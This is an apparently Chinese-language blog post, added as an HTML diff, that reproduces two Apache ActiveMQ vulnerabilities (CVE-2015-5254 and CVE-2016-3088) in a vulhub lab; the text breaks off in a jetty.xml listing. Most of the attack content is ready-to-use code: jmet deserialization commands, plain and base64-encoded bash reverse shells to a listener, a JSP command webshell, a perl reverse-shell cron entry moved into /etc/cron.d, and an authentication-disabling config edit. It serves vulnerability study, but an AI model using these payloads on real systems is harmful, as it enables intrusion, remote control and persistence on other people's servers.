@@ -1,0 +1,1366 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="漏洞复现,ActiveMQ,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demos's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="ActiveMQ介绍Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。 ActiveMQ 反序列化漏洞（CVE-2015-5254）Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Jav">
+<meta name="keywords" content="漏洞复现,ActiveMQ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ActiveMQ系列漏洞复现总结">
+<meta property="og:url" content="https://www.lsowl.top/2019/11/09/ActiveMQ系列漏洞复现总结/index.html">
+<meta property="og:site_name" content="Demos&#39;s Blog">
+<meta property="og:description" content="ActiveMQ介绍Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。 ActiveMQ 反序列化漏洞（CVE-2015-5254）Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Jav">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052136.97.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052552.19.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052687.45.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052707.54.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052738.38.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573053017.02.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573053093.94.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573053195.62.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573053273.71.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573139382.64.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573135241.8.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573135282.18.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573135374.75.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573136077.93.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573136191.41.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573136295.7.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573136482.48.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573137824.25.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573137849.35.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573140136.91.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573140222.12.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573224817.49.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573227616.67.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573227713.07.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573227889.76.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573227957.58.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573228065.83.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573228512.05.png">
+<meta property="og:updated_time" content="2019-11-08T16:03:29.239Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ActiveMQ系列漏洞复现总结">
+<meta name="twitter:description" content="ActiveMQ介绍Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。 ActiveMQ 反序列化漏洞（CVE-2015-5254）Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Jav">
+<meta name="twitter:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052136.97.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.lsowl.top/2019/11/09/ActiveMQ系列漏洞复现总结/">
+
+
+
+
+
+  <title>ActiveMQ系列漏洞复现总结 | Demos's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Demos's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">It's A Long Road</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.lsowl.top/2019/11/09/ActiveMQ系列漏洞复现总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Demos">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Demos's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ActiveMQ系列漏洞复现总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-09T00:01:39+08:00">
+                2019-11-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞复现</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2,583
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="ActiveMQ介绍"><a href="#ActiveMQ介绍" class="headerlink" title="ActiveMQ介绍"></a>ActiveMQ介绍</h2><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</p>
+<h2 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ 反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ 反序列化漏洞（CVE-2015-5254）</h2><p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
+<h3 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h3><p>vulhub</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>环境运行后，将监听61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。访问<code>http://your-ip:8161</code>即可看到web管理页面，不过这个漏洞理论上是不需要web的。 所以ActiveMQ 反序列化漏洞存在得前提是开放了61616是工作端口，这样才可以收到JMS消息。</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052136.97.png" alt></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
+<li>构造（可以使用ysoserial）可执行命令的序列化对象</li>
+<li>作为一个消息，发送给目标61616端口</li>
+<li>访问web管理页面，读取消息，触发漏洞（vulhub的web管理页面账号密码:admin/admin）</li>
+</ol>
+<p>使用<a href="https://github.com/matthiaskaiser/jmet" target="_blank" rel="noopener">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p>
+<p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-<span class="number">0.1</span>.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"touch /tmp/success"</span> -Yp ROME your-ip <span class="number">61616</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p> emmm,ysoserial不会用，留个坑后面补上</p>
+</blockquote>
+<p><strong>执行payload,在目标主机中得tmp目录下生成文件</strong>（event是JMS消息的名称）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-<span class="number">0.1</span>.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"touch /tmp/4.txt"</span> -Yp ROME <span class="number">192.168</span>.1.103 <span class="number">61616</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052552.19.png" alt></p>
+<p><strong>在web界面读取消息、触发漏洞</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.1.103:8161/admin/browse.jsp?JMSDestination=event</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052687.45.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052707.54.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052738.38.png" alt></p>
+<p><strong>反弹shell</strong></p>
+<p>这里注意一个点，反弹shell时要将命令base64加密后发送，利用bash在目标机解密执行，在不加密的情况下执行命令不能反弹shell，不知道为啥。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.102/8888 0&gt;&amp;1             <span class="comment">#加密前</span></span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzg4ODggMD4mMQ==   <span class="comment">#加密后</span></span><br><span class="line"> </span><br><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> -Yp ROME 192.168.1.103   61616                                         <span class="comment">#执行的命令</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573053017.02.png" alt></p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573053093.94.png" alt></p>
+<p><strong>本地监听端口</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat.exe -l -p 8888</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573053195.62.png" alt></p>
+<p>实际测试中只需要反弹到公网地址即可(以本地环境反弹到公网测试)</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573053273.71.png" alt></p>
+<h2 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h2><h3 id="背景简述"><a href="#背景简述" class="headerlink" title="背景简述"></a>背景简述</h3><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p>
+<p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p>
+<ul>
+<li><p>其使用率并不高</p>
+</li>
+<li><p>文件操作容易出现漏洞</p>
+</li>
+</ul>
+<p>所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</p>
+<h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p>
+<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>启动vulhub中的漏洞环境(ActiveMQ 5.11.1)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up -d   <span class="comment">#环境默认账户密码为admin/admin</span></span><br></pre></td></tr></table></figure>
+<p>查看网站的根路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103:8161/admin/test/systemProperties.jsp</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573139382.64.png" alt></p>
+<p>利用漏洞写入webshell(5.11.1在利用PUT方法写时需要进行身份认证)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.103:8161/fileserver   #利用fileserver使用PUT方法传文件</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573135241.8.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573135282.18.png" alt></p>
+<p>访问fileserver中上传的2.jsp不解析</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573135374.75.png" alt></p>
+<p>移动文件到可以解析的目录（api或admin目录，这个版本一共也需要身份认证）</p>
+<p>在5.7版本可以报绝对路径，这个版本不行，应为时漏洞复现，所以直接使用已知的<code>/opt/apache-activemq-5.11.1/webapps</code></p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573136077.93.png" alt></p>
+<p>重新在身份认证后移动<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573136191.41.png" alt></p>
+<p>访问shell地址，可以看到成功执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103:8161/api/2.jsp?pass</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573136295.7.png" alt></p>
+<p>用冰蝎客户端连接失败，还是由于身份认证的原因</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573136482.48.png" alt></p>
+<p>所以通过客户端连接(冰蝎/蚁剑都不行)，尝试传别的马</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">out.print(<span class="string">"Hello&lt;/br&gt;"</span>);</span><br><span class="line"> </span><br><span class="line">String strcmd=request.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line"> </span><br><span class="line">String line=<span class="keyword">null</span>;</span><br><span class="line"> </span><br><span class="line">Process p=Runtime.getRuntime().exec(strcmd);</span><br><span class="line"> </span><br><span class="line">BufferedReader br=<span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(p.getInputStream()));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span>((line=br.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line"> </span><br><span class="line">  out.print(line+<span class="string">"&lt;/br&gt;"</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573137824.25.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573137849.35.png" alt></p>
+<h3 id="写入计划任务，自动化弹shell-要求active必须时root权限运行的"><a href="#写入计划任务，自动化弹shell-要求active必须时root权限运行的" class="headerlink" title="写入计划任务，自动化弹shell(要求active必须时root权限运行的)"></a>写入计划任务，自动化弹shell(要求active必须时root权限运行的)</h3><p>这是一个比较稳健的方法。首先上传cron配置文件（注意，换行一定要<code>\n</code>，不能是<code>\r\n</code>，否则crontab执行会失败）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * root /usr/bin/perl -e <span class="string">'use Socket;$i="192.168.1.102";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573140136.91.png" alt></p>
+<p>将其移动到<code>/etc/cron.d/root</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/3.txt HTTP/1.1</span><br><span class="line">Destination: file:///etc/cron.d/root</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573140222.12.png" alt></p>
+<p>反弹shell成功</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573224817.49.png" alt></p>
+<h3 id="写入jetty-xml或jar"><a href="#写入jetty-xml或jar" class="headerlink" title="写入jetty.xml或jar"></a>写入jetty.xml或jar</h3><blockquote>
+<p>在写入shell时会受到身份认证的限制，实际中除了口令爆破成功之外写shell比较困难，如果采用计划任务反弹shell，则需要activemq时root权限启动的，否则无法写入计划任务反弹shell,这个时候会想到写入jetty.xml配置文件覆盖原来的配置，取消身份认证即可写shell;思路没有问题，但是在本地测试时发现可以写入覆盖，但是必须要active重启才可以使配置生效，所以只有在root权限下才可以写入计划任务让服务重启，但此时可以直接弹shell了，就没必要去覆盖配置了，总体来说，思路上没有问题。</p>
+</blockquote>
+<p>jetty.xml配置如下:只需要将身份认证的true改为false即可</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        Licensed to the Apache Software Foundation (ASF) under one or more contributor</span></span><br><span class="line"><span class="comment">        license agreements. See the NOTICE file distributed with this work for additional</span></span><br><span class="line"><span class="comment">        information regarding copyright ownership. The ASF licenses this file to You under</span></span><br><span class="line"><span class="comment">        the Apache License, Version 2.0 (the "License"); you may not use this file except in</span></span><br><span class="line"><span class="comment">        compliance with the License. You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or</span></span><br><span class="line"><span class="comment">        agreed to in writing, software distributed under the License is distributed on an</span></span><br><span class="line"><span class="comment">        "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express 